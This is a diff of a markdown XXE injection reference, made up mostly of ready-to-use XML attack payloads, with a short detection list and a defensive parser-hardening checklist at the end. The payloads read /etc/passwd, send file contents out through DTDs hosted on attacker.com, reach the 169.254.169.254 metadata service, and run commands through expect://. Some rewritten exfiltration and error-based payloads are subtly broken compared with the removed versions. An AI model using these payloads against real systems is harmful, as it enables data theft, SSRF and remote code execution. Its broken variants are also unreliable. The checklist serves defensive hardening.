@@ -1,27 +1,12 @@
-# XML External Entity (XXE): Complete Reference
+# XML External Entity (XXE) Injection: 2026 Reference
 
-## Detection Phase
+## Attack Classes
 
-### Classic XXE
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe "test">
-]>
-<root>&xxe;</root>
-```
-
-### File Read XXE
+### Classic XXE (In-Band)
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<root>&xxe;</root>
-
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
 ]>
 <root>&xxe;</root>
 ```
@@ -30,73 +15,67 @@
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://COLLABORATOR.oastify.com/test">
+  <!ENTITY % xxe SYSTEM "http://attacker.com/exfil.dtd">
+  %xxe;
+]>
+<root/>
+```
+exfil.dtd:
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
+%eval;
+&exfil;
+```
+
+### Blind XXE via Error Messages
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+```
+
+### XXE to SSRF
+```xml
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
 ]>
 <root>&xxe;</root>
 ```
 
-## Blind XXE Exfiltration
-
-### OOB Data Exfiltration
+## Protocol/Port Smuggling
 ```xml
-# Step 1: External DTD on attacker server
-# attacker.dtd:
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR.oastify.com/?data=%file;'>">
-%eval;
-%exfil;
-
-# Step 2: Victim XML
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY % start SYSTEM "http://attacker.com/attacker.dtd">
-  %start;
-]>
-<root>&exfil;</root>
+<!ENTITY xxe SYSTEM "expect://id">    <!-- Expect extension RCE -->
+<!ENTITY xxe SYSTEM "compress.zlib://file:///etc/passwd">
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
 ```
 
-### Error-Based Blind XXE
-```xml
-# Force error that includes file content
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
-%eval;
-%error;
-```
-
-## XInclude Attacks
-```xml
-# When you control XML within an existing document
-<root xmlns:xi="http://www.w3.org/2001/XInclude">
-  <xi:include parse="text" href="file:///etc/passwd"/>
-</root>
-```
-
-## Parameter Entity Chaining
+## Java XXE
 ```xml
 <!DOCTYPE foo [
-  <!ENTITY % p1 SYSTEM "http://attacker.com/evil.dtd">
-  %p1;
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY xxe2 SYSTEM "jar:file:///path/to/file!/">
 ]>
-<root>&exfil;</root>
 ```
 
-## Binary File Exfiltration
-When exfiltrating binary files, encode to base64 first.
-
-### FTP Exfiltration
+### Parameter Entities
 ```xml
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
-%eval;
-%exfil;
+<!DOCTYPE foo [
+  <!ENTITY % param1 SYSTEM "file:///etc/passwd">
+  %param1;
+]>
 ```
 
-## CVSS Scoring
-| Scenario | CVSS | Criteria |
-|----------|------|---------|
-| XXE file read | 7.5 | Network, Low, No auth, Confidentiality high |
-| XXE -> SSRF -> internal scan | 8.6 | Network, Low, No auth, Changed scope |
-| XXE -> DoS (Billion Laughs) | 6.5 | Network, Low, No auth, Availability high |
-| Blind XXE OOB data exfil | 7.5 | Network, Low, No auth, Changed scope |
-| XXE -> RCE (expect plugin) | 9.8 | Network, Low, No auth, Full impact |
+## Detection
+1. All XML parsers are potential XXE vectors
+2. Test with `<!DOCTYPE foo [<!ENTITY xxe "test">]>` — does "test" appear in output?
+3. Test with external entity pointing to collaborator
+4. Check content types: `application/xml`, `text/xml`, `application/soap+xml`
+5. JSON endpoints may accept XML (hidden XML parser)
+
+## Defensive Checklist
+1. Disable DOCTYPE entirely: `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
+2. Disable external entities: `setFeature("http://xml.org/sax/features/external-general-entities", false)`
+3. Disable parameter entities: `setFeature("http://xml.org/sax/features/external-parameter-entities", false)`
+4. Use less complex data format (JSON) when XML not required
+5. Upgrade XML parser to latest version
